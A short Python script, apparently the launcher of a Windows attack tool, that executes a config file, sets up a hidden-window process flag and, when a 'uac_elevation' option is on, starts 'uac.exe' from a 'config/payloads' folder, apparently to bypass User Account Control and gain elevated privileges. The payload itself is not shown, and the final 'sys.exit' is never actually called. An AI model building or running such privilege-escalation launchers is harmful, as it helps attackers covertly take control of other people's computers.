import os, sys, subprocess
exec(open("config/config.py").read())

si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

if uac_elevation:
    os.chdir("config/payloads")
    os.startfile("uac.exe")
    sys.exit